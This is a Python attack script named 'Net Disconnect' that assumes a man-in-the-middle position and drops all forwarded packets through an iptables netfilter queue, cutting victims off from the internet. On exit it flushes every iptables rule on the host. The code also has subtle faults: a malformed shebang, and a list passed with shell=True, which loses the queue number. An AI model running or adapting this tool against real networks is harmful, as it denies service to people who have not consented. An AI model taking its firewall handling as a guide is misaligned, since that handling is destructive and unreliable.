#! usr/bin/env python

import netfilterqueue
import argparse
import subprocess
import sys
import os
import random


def process_packet(packet):
    packet.drop()


def run_queue(queue_number):
    queue = netfilterqueue.NetfilterQueue()
    try:
        print("[+] Internet connection Stopped...")
        print("[+] Press Ctrl + C to start the internet again.")
        queue.bind(queue_number, process_packet)
    except OSError:
        print("[-] Error! Please try to run program again with different queue number")
        sys.exit()
    queue.run()


def get_arguments():
    parser = argparse.ArgumentParser(prog="Net Disconnect",
                                     usage="%(prog)s [options]\n\t[-q | --queue-num] value",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description=""">>> | Net Disconnect v1.0 by Hack Hunt | <<<
    ------------------------------------""",
                                     epilog="**Note - You need to be the Man-in-the-middle (MITM).")

    parser._optionals.title = "Optional Arguments"
    parser.add_argument("-q", "--queue-num",
                        dest="queue",
                        metavar="",
                        help="Specify a queue number for managing IP Tables.")

    args = parser.parse_args()
    return check_arguments(args.queue)


def check_arguments(queue):
    if queue is None:
        print("[+] Generating a random queue number...")
        queue = random.randint(0, 100)
    else:
        try:
            queue = int(queue)
        except ValueError:
            print("[-] Enter a correct queue number.")
            sys.exit()

    return queue


def main():
    try:
        queue_number = get_arguments()

        DEVNULL = open(os.devnull, 'wb')

        print("[+] Managing iptables rules for queue {0} ...".format(queue_number))

        subprocess.call(["iptables -I FORWARD -j NFQUEUE --queue-num", str(queue_number)],
                        shell=True,
                        stderr=DEVNULL, stdout=DEVNULL, stdin=DEVNULL)

        print("\n[+] Initializing Net Disconnect v1.0\n")

        run_queue(queue_number)
    except KeyboardInterrupt:
        print("\n[+] Fixing iptables")
        subprocess.call("iptables --flush", shell=True,
                        stdin=DEVNULL, stdout=DEVNULL, stderr=DEVNULL)
        print("[+] Exiting...")
        sys.exit()


main()
